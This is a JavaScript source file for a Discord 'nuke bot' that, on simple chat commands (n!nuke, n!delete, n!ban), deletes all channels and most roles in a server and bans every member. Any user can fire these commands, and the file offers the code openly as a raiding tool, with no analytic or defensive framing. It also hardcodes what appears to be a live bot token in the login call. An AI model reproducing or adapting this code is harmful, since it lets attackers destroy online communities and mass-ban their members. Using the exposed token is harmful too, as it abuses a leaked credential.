const discord = require("discord.js");
const nuke = new discord.Client();

nuke.on("ready", () =>{
console.log("This bot has been developed by Selection.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Discord Servers :) | Dev: Selection` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot"));
}
if(msg.content.toLowerCase().startsWith("n!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("n!" + "ban")){
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot"));
}
if(msg.content.toLowerCase().startsWith("n!" + "help")){
    msg.channel.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | Developed By Selection" },
            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact Selection"
        }
    })
}
});

nuke.login("MTAwNTQ5ODMzNjcyNTQzODUxNQ.G3v59h.RCjSTLNJ_L7qrePpMXyD-fMSLqbnYWZayyA640");
